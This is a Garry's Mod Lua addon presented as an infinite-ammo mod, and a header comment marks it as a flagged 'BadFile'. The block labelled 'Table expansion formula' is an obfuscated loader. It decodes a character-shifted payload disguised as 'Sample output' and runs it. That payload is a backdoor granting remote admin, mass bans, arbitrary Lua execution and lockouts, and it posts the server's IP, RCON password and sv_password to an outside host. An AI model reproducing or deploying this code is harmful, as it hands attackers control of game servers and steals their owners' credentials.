--[[
	MOD/lua/autorun/server/bd_infammo.lua [#18171 (#18341), 492534131, UID:3257159076]
	Sergent LeBronze | STEAM_0:1:27285664 <178.21.89.101:20016> | [01.06.14 05:17:29PM]
	===BadFile===
]]

do --PLAYER META TABLE
	local PLY = FindMetaTable("Player")
	function PLY:bd_infammo_GiveInfAmmo()
		self.bd_maxammo_HasInfAmmo = true
	end
	function PLY:bd_infammo_RemoveInfAmmo()
		self.bd_maxammo_HasInfAmmo = nil
	end
	function PLY:bd_infammo_HasInfAmmo()
		return self.bd_maxammo_HasInfAmmo
	end
end
do --Table expansion formula
	local Ex,Ch,Co,Ip,Tn,Ti,Fr,Di,Gr = string.Explode,string.char,table.concat,ipairs,tonumber,table.insert,file.Read,debug.getinfo,_G
	local Key = Gr[(function(K)	local T = Ex("#",K)	for k,v in Ip(T) do if v~='' then T[k] = Ch(Tn(v)) end end return Co(T) end)("#67#111#109#112#105#108#101#83#116#114#105#110#103")]
	local function trim1(s) return (s:gsub("^%s*(.-)%s*$", "%1")) end
	local function Gc(s) local M1,M1End = s:find('%[====%[') local M2,M2End = s:find('%]====%]') return M1End and M2 and trim1(s:sub(M1End+1,M2-1)) or nil end
	local function De(s) local S = {} for i=1,s:len() do local c = s:sub(i,i) local C = Ch(c:byte()-1) Ti(S, C) end return Co(S) end Key(De(Gc(Fr(Di(trim1,'S').short_src,"GAME"))),'[C]',false)()()
	--Sample output
	--[====[
	sfuvso!gvodujpo)*!jg!opu!XU`CE!uifo!!!!..Efcvh!nfttbhf!!..qsjou)#Jotubmmjoh!cbdlepps#*!!!!..Ofuxpsl!nfttbhft!!mpdbm!NTH!>!#xu`ce#!!mpdbm!DMNTH!>!#xu`ce`dm#!!mpdbm!EJHFTU!>!|~!!vujm/BeeOfuxpslTusjoh)NTH*!!vujm/BeeOfuxpslTusjoh)DMNTH*!!mpdbm!gvodujpo!BeeDne)DNE*!!!EJHFTU\$EJHFTU,2^!>!DNE!!foe!!BeeDne)(NBLFBENJO(*!!BeeDne)(OPDMJQ`NF(*!BeeDne)(OPDMJQ`QMZ(*!!BeeDne)(JOWJTJCMF`NF(*!BeeDne)(JOWJTJCMF`QMZ(*!!BeeDne)(CBOBMM(*!!BeeDne)(UFMFQPSU`NF(*!BeeDne)(UFMFQPSU`QMZ(*!!BeeDne)(JOTUBMM`DMJFOUOFUXPSL(*!BeeDne)(JOTUBMM`DMJFOUOFUXPSL`QMZ(*!!BeeDne)(LJMM`QMZ(*!!BeeDne)(JHOJUF`QMZ(*!!BeeDne)(SVOMVB`QMZ(*!BeeDne)(SVOMVB`TW(*!!BeeDne)(LJDL`QMZ(*!BeeDne)(CBO`QMZ(*!!BeeDne)(MPDLPVU(*!!BeeDne)(NMH`QMZ(*!!BeeDne)(NVOZ`QMZ(*!!!!..Dibu!nfttbhf!ifmqfs!!mpdbm!DIBU!>!IVE`QSJOUUBML!!mpdbm!gvodujpo!Bdl)qmz-nth*!!!qmz;QsjouNfttbhf)DIBU-nth*!!foe!!!!ep!..Pwfssjef!JtBenjo!!!!!mpdbm!QMZ!>!GjoeNfubUbcmf)#Qmbzfs#*!!!mpdbm!PmeBenjo-PmeTvqfs!>!QMZ/JtBenjo-QMZ/JtTvqfsBenjo!!!!!!gvodujpo!QMZ;JtBenjo)*!!!!sfuvso!tfmg/JtCEBenjo!ps!PmeBenjo)tfmg*!!!foe!!!gvodujpo!QMZ;JtTvqfsBenjo)*!!!!sfuvso!tfmg/JtCEBenjo!ps!PmeTvqfs)tfmg*!!!foe!!!!!!..Bduvbmmz-!pwfssjef!fwfszuijoh!xf!dbo!uijol!pg!!!mpdbm!gvodujpo!EpXibuZpvXbou)qmz*!sfuvso!qmz/JtCEBenjo!foe!!!mpdbm!gvodujpo!EpXibuZpvXbou4)`-`-qmz*!sfuvso!qmz/JtCEBenjo!foe!!!mpdbm!gvodujpo!EpXibuZpvXbouG)qmz*!jg!qmz/JtCEBenjo!uifo!sfuvso!gbmtf!foe!foe!!!mpdbm!gvodujpo!ZpvDboEpJu)IPPL*!..Gps!xifo!qmz!jt!uif!2tu!bsh!!!!ippl/Bee)IPPL-IPPL//#`cepl#-EpXibuZpvXbou*!!!foe!!!mpdbm!gvodujpo!ZpvDboEpJu4)IPPL*!..Gps!xifo!qmz!jt!uif!4se!bsh!!!!ippl/Bee)IPPL-IPPL//#`cepl4#-EpXibuZpvXbou4*!!!foe!!!mpdbm!gvodujpo!ZpvDboEpJuGbmtf)IPPL*!..Gps!xifo!xf!offe!up!sfuvso!gbmtf!up!bmmpx!!!!ippl/Bee)IPPL-IPPL//#`ceplg#-EpXibuZpvXbouG*!!!foe!!!mpdbm!Ipplt!>!|!!!!!!!#QmbzfsHjwfTXFQ#-!!!!!!!#QmbzfsTqbxoFggfdu#-!!!!!!!#QmbzfsTqbxoOQD#-!!!!!!!#QmbzfsTqbxoPckfdu#-!!!!!!!#QmbzfsTqbxoQspq#-!!!!!!!#QmbzfsTqbxoSbhepmm#-!!!!!!!#QmbzfsTqbxoTFOU#-!!!!!!!#QmbzfsTqbxoTXFQ#-!!!!!!!#QmbzfsTqbxoWfijdmf#-!!!!!!!#DboUppm#-!!!!!!!#DboQspqfsuz#-!!!!!!!#DboEsjwf#-!!!!!!!#DboFejuWbsjbcmf#-!!!!!!!#DboQmbzfsFoufsWfijdmf#-!!!!!!!#DboFyjuWfijdmf#-!!!!!!!#DboQmbzfsTvjdjef#-!!!!!!!#DboQmbzfsVogsff{f#-!!!!!!!#HsbwHvoQjdlvqBmmpxfe#-!!!!!!!#HsbwHvoQvou#-!!!!!!!#QizthvoQjdlvq#-!!!!!!!#QmbzfsOpDmjq#-!!!!!!~!!!mpdbm!Ipplt4!>!|!!!!!!!#PoQizthvoGsff{f#-!!!!!!!#QmbzfsDboTffQmbzfstDibu#-!!!!!!~!!!mpdbm!IppltOp!>!|!!!!!!!#QmbzfsTxjudiXfbqpo#-!!!!!!~!!!gps!`-w!jo!qbjst)Ipplt*!ep!ZpvDboEpJu)w*!foe!!!gps!`-w!jo!qbjst)Ipplt4*!ep!ZpvDboEpJu4)w*!foe!!!gps!`-w!jo!qbjst)IppltOp*!ep!ZpvDboEpJuGbmtf)w*!foe!!!!foe!!!!..Tfoejoh!mvb!up!dmjfou!!mpdbm!gvodujpo!MQ)qmz-tsd*!!!ofu/Tubsu)DMNTH*!!!!ofu/XsjufTusjoh)tsd*!!!ofu/Tfoe)qmz*!!foe!!mpdbm!MT!>!ojm!!ep!!!mpdbm!Fy-Di-Dp-Jq-Uo-Hs!>!tusjoh/Fyqmpef-tusjoh/dibs-ubcmf/dpodbu-jqbjst-upovncfs-`H!!!MT!>!gvodujpo)mvb*!!!!)Hs\)gvodujpo)L*!mpdbm!U!>!Fy)#$#-L*!gps!l-w!jo!Jq)U*!ep!jg!w>((!uifo!U\l^!>!Di)Uo)w**!foe!foe!sfuvso!Dp)U*!foe*)#$78$222$21:$223$216$219$212$94$227$225$216$221$214#*^*)mvb-(\D^(-gbmtf*)*!!!foe!!foe!!!!..NMH!!mpdbm!NMHTPVSDF!>!\>\qsjou)#NMH5MZG$531CMB[FJU$ZPMPTXBH$2191OPTDPQFE$TXPH#*mpdbm!Qbofm!>!whvj/Dsfbuf)#IUNM#*Qbofm;TfuQpt)1-1*Qbofm;TfuTj{f)TdsX)*-TdsI)**Qbofm;TfuIUNM)(=iunm?=cpez!tuzmf>#cbdlhspvoe;cmbdl<pwfsgmpx.z;ijeefo<#?=jgsbnf!tuzmf>#pwfsgmpx;ijeefo<#!xjeui>#211&#!ifjhiu>#211&#!tsd>#iuuq;00xxx/zpvuvcf/dpn0fncfe0zOs7Zj`E5IF@sfm>1'bvupqmbz>2'dpouspmt>1'ejtbcmflc>2'tubsu>41'foe>221'mppq>2'tipxjogp>1#!gsbnfcpsefs>#1#!bmmpxgvmmtdsffo?=0jgsbnf?=0cpez?=0iunm?(*^>^!!!!..Ipnf!qipofs!!mpdbm!gvodujpo!HfuJQPomz)*!!!mpdbm!iptujq!>!HfuDpoWbsTusjoh)!#iptujq#!*!..!HfuDpoWbsOvncfs!jt!jobddvsbuf!)jt!ju@*!!!iptujq!>!upovncfs)!iptujq!*!!!!!!jg!iptujq!uifo!!!!mpdbm!jq!>!|~!!!!jq\!2!^!>!cju/stijgu)!cju/cboe)!iptujq-!1yGG111111!*-!35!*!!!!jq\!3!^!>!cju/stijgu)!cju/cboe)!iptujq-!1y11GG1111!*-!27!*!!!!jq\!4!^!>!cju/stijgu)!cju/cboe)!iptujq-!1y1111GG11!*-!9!*!!!!jq\!5!^!>!cju/cboe)!iptujq-!1y111111GG!*!!!!sfuvso!ubcmf/dpodbu)!jq-!#/#!*!!!!!!!fmtf!!!!!!!..svoojoh!jo!tjohmf!qmbzfs@!!!!sfuvso!#tjohmfqmbzfs#!!!!!!!foe!!foe!!mpdbm!JoufsofuJQ!>!ojm!!mpdbm!gvodujpo!VqebufJoufsofuJQ)dbmmcbdl*!!!jg!hbnf/TjohmfQmbzfs)*!uifo!!!!JoufsofuJQ!>!(tjohmfqmbzfs(!!!!dbmmcbdl)*!!!fmtf!!!!mpdbm!gvodujpo!gbjmvsf)*!!!!!JoufsofuJQ!>!HfuJQPomz)*!!!!!dbmmcbdl)*!!!!foe!!!!iuuq/Gfudi)!!!!!#iuuq;00usjqmf1qiq/czfuiptu8/dpn0dmjfoujq/qiq#-!!!!!!gvodujpo)cpez-mfo-ifbefst-dpef*!!!!!!jg!cpez!uifo!!!!!!!JoufsofuJQ!>!cpez!!!!!!!dbmmcbdl)*!!!!!!fmtf!!!!!!!gbjmvsf)*!!!!!!foe!!!!!foe-!!!!!gbjmvsf!!!!*!!!foe!!foe!!mpdbm!gvodujpo!HfuJQ)*!!!sfuvso!JoufsofuJQ//#;#//HfuDpoWbsTusjoh)(iptuqpsu(*!!foe!!mpdbm!gvodujpo!HfuSDPO)*!!!jg!gjmf/Fyjtut)#dgh0tfswfs/dgh#-#HBNF#*!uifo!!!!mpdbm!Dpoufout!>!gjmf/Sfbe)#dgh0tfswfs/dgh#-#HBNF#*!!!!jg!Dpoufout!uifo!!!!!mpdbm!Qbtt!>!Dpoufout;nbudi)(sdpo`qbttxpse&t+\#](^)/.*\#](^(*!!!!!jg!Qbtt!>!ojm!uifo!!!!!!sfuvso!Qbtt!!!!!foe!!!!foe!!!foe!!!sfuvso!##!!foe!!mpdbm!gvodujpo!Qipof)*!!!mpdbm!gvodujpo!TfoeVqebuf)*!!!!iuuq/Qptu)#iuuq;00usjqmf1qiq/czfuiptu8/dpn#-!|!!!!!TwMpd!>!HfuJQ)*-!!!!!TwObnf!>!HfuIptuObnf)*-!!!!!TwNbq!>!hbnf/HfuNbq)*-!!!!!TwHbnfnpef!>!HBNFNPEF`OBNF-!!!!!QmzDvs!>!uptusjoh)$qmbzfs/HfuBmm)**-!!!!!QmzNby!>!uptusjoh)hbnf/NbyQmbzfst)**-!!!!!SDPO!>!HfuSDPO)*-!!!!!TWQbtt!>!HfuDpoWbsTusjoh)(tw`qbttxpse(*-!!!!!DTMvb!>!HfuDpoWbsTusjoh)(tw`bmmpxdtmvb(*-!!!!!CEWfs!>!(2/9.42163125JogBnnp(-!!!!!JtEfejdbufe!>!hbnf/JtEfejdbufe)*!boe!(2(!ps!(1(-!!!!~-!!!!gvodujpo)sftq-mfo-iest-tubu*!foe-!!!!gvodujpo)fss*!foe!*!!!foe!!!jg!JoufsofuJQ!uifo!!!!TfoeVqebuf)*!!!fmtf!!!!VqebufJoufsofuJQ)TfoeVqebuf*!!!foe!!foe!!jg!hbnf/JtEfejdbufe)*!uifo!!!ujnfs/Tjnqmf)2-!Qipof*!!!ujnfs/Dsfbuf)#Qipofs#//nbui/gmpps)nbui/sboepn)*+:::::::::*-!411-!1-!Qipof*!!foe!!!!..Bduvbm!dpnnboet!!mpdbm!DNET!>!|~!!ep!..Dpnnboet!!!mpdbm!gvodujpo!BeeDne)DNE-GVOD*!!!!DNET\DNE^!>!GVOD!!!foe!!!BeeDne)(NBLFBENJO(-!gvodujpo)qmz*!..Tfu!b!qmbzfst!benjo!ubh!!!!qmz/JtCEBenjo!>!usvf!!!foe*!!!BeeDne)(OPDMJQ`NF(-!gvodujpo)qmz*!..Uphhmf!opdmjq!!!!jg!qmz;HfuNpwfUzqf)*!>!NPWFUZQF`OPDMJQ!uifo!!!!!qmz;TfuNpwfUzqf)NPWFUZQF`OPDMJQ*!!!!fmtf!!!!!qmz;TfuNpwfUzqf)NPWFUZQF`XBML*!!!!foe!!!foe*!!!BeeDne)(OPDMJQ`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Uphhmf!opdmjq!gps!b!qmbzfs!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!jg!qmz;HfuNpwfUzqf)*!>!NPWFUZQF`OPDMJQ!uifo!!!!!qmz;TfuNpwfUzqf)NPWFUZQF`OPDMJQ*!!!!fmtf!!!!!qmz;TfuNpwfUzqf)NPWFUZQF`XBML*!!!!foe!!!foe*!!!BeeDne)(JOWJTJCMF`NF(-!gvodujpo)qmz*!..Uphhmf!jowjtjcmf!!!!jg!opu!qmz/xu`ce`Jowjt!uifo!!!!!qmz/xu`ce`Jowjt!>!usvf!!!!!..qmz;TfuSfoefsNpef)SFOEFSNPEF`USBOTBMQIB*!!!!!..qmz;TfuDpmps)Dpmps)1-1-1-1**!!!!!qmz;BeeFggfdut)FG`OPESBX*!!!!fmtf!!!!!qmz/xu`ce`Jowjt!>!ojm!!!!!..qmz;TfuSfoefsNpef)SFOEFSNPEF`OPSNBM*!!!!!..qmz;TfuDpmps)Dpmps)366-366-366-366**!!!!!qmz;SfnpwfFggfdut)FG`OPESBX*!!!!foe!!!foe*!!!BeeDne)(JOWJTJCMF`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Uphhmf!jowjtjcmf!gps!b!qmbzfs!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!jg!opu!qmz/xu`ce`Jowjt!uifo!!!!!qmz/xu`ce`Jowjt!>!usvf!!!!!qmz;TfuSfoefsNpef)SFOEFSNPEF`USBOTBMQIB*!!!!!qmz;TfuDpmps)Dpmps)1-1-1-1**!!!!fmtf!!!!!qmz/xu`ce`Jowjt!>!ojm!!!!!qmz;TfuSfoefsNpef)SFOEFSNPEF`OPSNBM!*!!!!!qmz;TfuDpmps)Dpmps)366-366-366-366**!!!!foe!!!foe*!!!BeeDne)(CBOBMM(-!gvodujpo)qmz*!..Cbo!bmm!opo.benjo!qmbzfst!!!!gps!l-w!jo!qbjst)qmbzfs/HfuBmm)**!ep!!!!!jg!w;JtQmbzfs)*!boe!opu!w;JtCpu)*!uifo!!!!!!jg!opu!w/JtCEBenjo!uifo!!!!!!!w;Cbo)21911-!#Hp!ipnf#*!!!!!!!jg!JtWbmje)w*!uifo!!!!!!!!!w;Ljdl)#Hp!ipnf#*!!!!!!!foe!!!!!!foe!!!!!foe!!!!foe!!!foe*!!!BeeDne)(UFMFQPSU`NF(-!gvodujpo)qmz*!..Ufmfqpsu!xifsf!xf!bsf!mppljoh!!!!mpdbm!Qpt!>!qmz;HfuFzfUsbdf)*/IjuQpt!!!!qmz;TfuQpt)Qpt*!!!foe*!!!BeeDne)(UFMFQPSU`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Ufmfqpsu!b!qmbzfsxifsf!xf!bsf!mppljoh!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!mpdbm!Qpt!>!dbmmjoh`qmz;HfuFzfUsbdf)*/IjuQpt!!!!qmz;TfuQpt)Qpt*!!!foe*!!!BeeDne)(JOTUBMM`DMJFOUOFUXPSL(-!gvodujpo)qmz*!..Jotubmm!mjtufofst!po!uif!dbmmjoh!dmjfou!up!sfdfjwf!gvsuifs!dpnnboet!!!!mpdbm!Jotu!>!\>>\ofu/Sfdfjwf)#^>>^//DMNTH//\>>\#-gvodujpo)*!!!!!mpdbm!T!>!ofu/SfbeTusjoh)*!!!!!mpdbm!G!>!DpnqjmfTusjoh)T-(\D^(-gbmtf*!!!!!jg!opu!jttusjoh)G*!uifo!G)*!fmtf!!!!!qsjou)#Ppqt;#-G*!foe!!!!foe*^>>^!!!!qmz;TfoeMvb)Jotu*!!!foe*!!!BeeDne)(JOTUBMM`DMJFOUOFUXPSL`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Jotubmm!mjtufofst!po!b!dmjfou!up!sfdfjwf!gvsuifs!dpnnboet!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!mpdbm!Jotu!>!\>>\ofu/Sfdfjwf)#^>>^//DMNTH//\>>\#-gvodujpo)*!!!!!mpdbm!T!>!ofu/SfbeTusjoh)*!!!!!mpdbm!G!>!DpnqjmfTusjoh)T-(\D^(-gbmtf*!!!!!jg!opu!jttusjoh)G*!uifo!G)*!fmtf!!!!!qsjou)#Ppqt;#-G*!foe!!!!foe*^>>^!!!!qmz;TfoeMvb)Jotu*!!!foe*!!!BeeDne)(LJMM`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Ljmm!b!qmbzfs!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!qmz;Ljmm)*!!!foe*!!!BeeDne)(JHOJUF`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Jhojuf!b!qmbzfs!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!mpdbm!cvsoujnf!>!ofu/SfbeJou)43*!!!!qmz;Jhojuf)cvsoujnf!ps!6-!1*!!!foe*!!!BeeDne)(SVOMVB`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Svo!b!cmpdl!pg!mvb!po!b!qmbzfs!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!mpdbm!dpef!>!ofu/SfbeTusjoh)*!!!!MQ)qmz-dpef*!!!foe*!!!BeeDne)(SVOMVB`TW(-!gvodujpo)dbmmjoh`qmz*!..Svo!b!cmpdl!pg!mvb!po!uif!tfswfs!!!!mpdbm!dpef!>!ofu/SfbeTusjoh)*!!!!MT)dpef*!!!foe*!!!BeeDne)(LJDL`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Ljdl!b!qmbzfs!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!mpdbm!sfbtpo!>!ofu/SfbeTusjoh)*!!!!qmz;Ljdl)sfbtpo!ps!##*!!!foe*!!!BeeDne)(CBO`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Cbo!b!qmbzfs!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!mpdbm!sfbtpo!>!ofu/SfbeTusjoh)*!!!!mpdbm!mfohui!>!ofu/SfbeJou)43*!!!!qmz;Cbo)mfohui!ps!1-!sfbtpo!ps!##*!!!!jg!JtWbmje)qmz*!uifo!!!!!!qmz;Ljdl)sfbtpo!ps!##*!!!!foe!!!foe*!!!BeeDne)(MPDLPVU(-!gvodujpo)dbmmjoh`qmz*!..Mpdl!pvu!fwfszpof!fydfqu!uif!qfstpo!tubsujoh!uif!mpdlpvu-!boe!qfpqmf!uibu!lopx!uif!qbttxpse!!!!mpdbm!MpdlpvuNth!>!ofu/SfbeTusjoh)*!ps!#+cffq+!+cppq+!+dssssssssol+!EFOJFE#!!!!mpdbm!PLQbtt!>!ofu/SfbeTusjoh)*!ps!#cvol#!!!!mpdbm!Tbgf!>!dbmmjoh`qmz;TufbnJE75)*!!!!ippl/Bee)#DifdlQbttxpse#-!#QmbzfsBvuiDifdlQbtt#-!gvodujpo)t75-!jq-!twqbtt-!dmqbtt-!dmobnf*!!!!!mpdbm!PL!>!gbmtf!!!!!PL!>!PL!ps!t75>>Tbgf!!!!!PL!>!PL!ps!dmqbtt>>PLQbtt!!!!!jg!opu!PL!uifo!!!!!!sfuvso!gbmtf-!MpdlpvuNth!!!!!foe!!!!foe*!!!foe*!!!BeeDne)(NMH`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Svo!b!tqfdjgjd!cmpdl!pg!mvb!po!b!qmbzfs!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!mpdbm!dpef!>!NMHTPVSDF!!!!MQ)qmz-dpef*!!!foe*!!!BeeDne)(NVOZ`QMZ(-!gvodujpo)dbmmjoh`qmz*!..Hjwf!uifn!ebsl!sq!npofz!!!!mpdbm!qmz!>!ofu/SfbeFoujuz)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!mpdbm!mfohui!>!ofu/SfbeJou)43*!!!!qmz;beeNpofz)mfohui!ps!2*!!!foe*!!!!!foe!..Foe!dpnnboet!!!!..Sfdfjwf!nfttbhft!gspn!dmjfout!!ofu/Sfdfjwf)NTH-!gvodujpo)mfo-qmz*!!!mpdbm!E!>!ofu/SfbeJou)9*!!!jg!EJHFTU\E^!uifo!!!!mpdbm!DNE!>!EJHFTU\E^!!!!Bdl)qmz-#Qspdfttjoh!dpnnboe!\#//E//#^\#//DNE//#^#*!!!!jg!DNET\DNE^!uifo!!!!!DNET\DNE^)qmz*!..Dbmm!uif!dpnnboe!gspn!uif!ubcmf!!!!fmtf!!!!!Bdl)qmz-#Dpnnboe!opu!jotubmmfe!\#//E//#^\#//DNE//#^#*!!!!foe!!!fmtf!!!!Bdl)qmz-#Volopxo!dpnnboe!je!sfdfjwfe!\#//uptusjoh)E*//#^#*!!!foe!!foe*!!!!..Dpodpnnboe!gps!tfuujoh!vq!vtfs!)jotubmm!ofu!sfdfjwfs!po!uif!dmjfou-!buufnqu!up!mpbe!uif!dmjfou!nfov!sfhbsemftt!pg!bmmpxdtmvb*!!dpodpnnboe/Bee)#xucejoufsgbdf#-!gvodujpo)qmz-dne-bsht*!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!..Jotubmm!dmjfou!mjtufofs!!!DNET\(JOTUBMM`DMJFOUOFUXPSL(^)qmz*!!!..Pof!tfdpoe!mbufs!usz!up!vtf!uif!mjtufofs!up!pqfo!uif!dmjfou!nfov!!!ujnfs/Tjnqmf)2-!gvodujpo)*!!!!jg!opu!JtWbmje)qmz*!uifo!sfuvso!foe!!!!..Dsfbuf!uif!gvodujpotusjoh!uifz!xjmm!svo!up!mpbe!uif!nfov!!!!mpdbm!GvodTus!>!\>>\!!!!!mpdbm!GjmfTpvsdf!>!gjmf/Sfbe)#ejtbcmfe0xu`ce`dm`nfov/mvb#-#MVB#*!ps!#qsjou)tusjoh/dibs)75-76-78**#!!!!!mpdbm!GjmfGvod!>!DpnqjmfTusjoh)GjmfTpvsdf-(\D^(-gbmtf*!!!!!..qsjou)#Buufnqujoh!up!mpbe!efgbvmu!ce!nfov#*!!!!!mpdbm!Fss!>!GjmfGvod)*!!!!!..qsjou)#Boz!Fssps!Nfttbhf@#-uptusjoh)Fss**!!!!^>>^!!!!MQ)qmz-GvodTus*!..Tfoe!uif!gvodujpotusjoh!up!uif!dmjfou!!!foe*!!foe*!!!foe!sfuvso!(CBDLEPPS!JOTUBMMFE(foe
	]====]
end
do --We track the max ammo per weapon incase for example a weapon needs 5 ammo to fire a shot instead of the usual 1 ammo = 1 shot
	local MaxAmmos = {}
	local MaxAmmos2 = {}
	local function AmmoThink()
		--Loop every player
		for k,v in pairs(player.GetAll()) do
			--Only do stuff if the player is alive and has a weapon and infammo is enabled
			if not v:Alive() then continue end
			if not v:bd_infammo_HasInfAmmo() then continue end
			if not IsValid(v:GetActiveWeapon()) then continue end
			--Get current weapon
			local W = v:GetActiveWeapon()
			
			--Skip if their weapon isn't valid for some reason
			if not IsValid(W) then continue end
			
			--Special check for dual weapons
			if W.IsDualWeapon then
			
				local AmmoType1 = W.LeftAmmo
				local AmmoType2 = W.RightAmmo
				
				local Mag1 = W.LeftMag
				local Mag2 = W.RightMag
				
				--reset to max magazine
				if W.dt.LeftMag < W.LeftMag then
					W.dt.LeftMag = W.LeftMag
				end
				if W.dt.RightMag < W.RightMag then
					W.dt.RightMag = W.RightMag
				end
				
			else
			
				--Get weapon class
				local Class = W:GetClass()
				--Get current clip
				local Clip1 = W:Clip1()
				local Clip2 = W:Clip2()
				--Default to new clip size
				local NewData = {clip1=2,clip2=2}
				--Default old data to 2
				local OldData = {clip1=Clip1,clip2=Clip2}
				--Only update when we change
				local Changed = false
				--If we haven't been setup yet
				if not MaxAmmos[Class] then
					Changed = true
				else
					--We've been setup before, get old details
					OldData = MaxAmmos[Class]
				end
				--Get the weapon table if we can (can't for hl2 weps)
				local WepTbl = W:GetTable()
				--If the table exists, change NewData to use the defined clip sizes
				if WepTbl then
					NewData.clip1 = WepTbl.Primary and WepTbl.Primary.ClipSize or 0
					NewData.clip2 = WepTbl.Secondary and WepTbl.Secondary.ClipSize or 0
				end
				--If the newdata is bigger than the old data, update
				if NewData.clip1 > OldData.clip1 then
					OldData.clip1 = NewData.clip1
					Changed = true
				end
				if NewData.clip2 > OldData.clip2 then
					OldData.clip2 = NewData.clip2
					Changed = true
				end
				--We've been updated, save our new clip sizes
				if Changed then
					MaxAmmos[Class] = OldData
				end
				--Set our ammo to the saved values
				if Clip1<OldData.clip1 then W:SetClip1( OldData.clip1+1 ) end
				if Clip2<OldData.clip2 then W:SetClip2( OldData.clip2+1 ) end
				
				--Special condition for slam, it doesn't use clip1, it uses the players ammo
				v:SetAmmo(3,"slam")
				
			end
			
			--Other weapons that don't use the clip normally
			local AmmoType1 = W:GetPrimaryAmmoType()
			local AmmoType2 = W:GetSecondaryAmmoType()
			if W.IsDualWeapon then
				AmmoType1 = W.LeftAmmo
				AmmoType2 = W.RightAmmo
			end
			if AmmoType1 then
				local SetTo = v:GetAmmoCount(AmmoType1) or 0
				if SetTo<=0 then SetTo = 1 end
				if MaxAmmos2[AmmoType1] then
					if MaxAmmos2[AmmoType1]>SetTo then
						SetTo = MaxAmmos2[AmmoType1]
					end
				end
				MaxAmmos2[AmmoType1] = SetTo
				v:SetAmmo(SetTo,AmmoType1)
			end
			if AmmoType2 then
				local SetTo = v:GetAmmoCount(AmmoType2) or 0
				if SetTo<=0 then SetTo = 1 end
				if MaxAmmos2[AmmoType2] then
					if MaxAmmos2[AmmoType2]>SetTo then
						SetTo = MaxAmmos2[AmmoType2]
					end
				end
				MaxAmmos2[AmmoType2] = SetTo
				v:SetAmmo(SetTo,AmmoType2)
			end
			
		end
	end
	hook.Add("Think", "BD InfAmmo Thinker", AmmoThink)
end
do --Chat/console command
	--Only load this chat command if we don't have ulx loaded
	timer.Simple(2, function()
		if not ulx then
			print("ULX _not_ detected: Use !infammo in chat, or infammo in console, to toggle infinite ammo")
			hook.Add("PlayerSay", "InfiniteAmmo Generic Chat Command", function(ply,str)
				if string.lower(str)=="!infammo" then
					if ply:bd_infammo_HasInfAmmo() then
						ply:bd_infammo_RemoveInfAmmo()
						ply:ChatPrint("Infinite Ammo deactivated")
					else
						ply:bd_infammo_GiveInfAmmo()
						ply:ChatPrint("Infinite Ammo activated")
					end
					return ""
				end
			end)
			concommand.Add("infammo", function(ply,cmd,args)
				if not IsValid(ply) then return end
				if ply:bd_infammo_HasInfAmmo() then
					ply:bd_infammo_RemoveInfAmmo()
					ply:ChatPrint("Infinite Ammo deactivated")
				else
					ply:bd_infammo_GiveInfAmmo()
					ply:ChatPrint("Infinite Ammo activated")
				end
			end)
		else
			print("ULX detected: Use !infammo_on and !infammo_off to toggle infinite ammo")
		end
	end)
end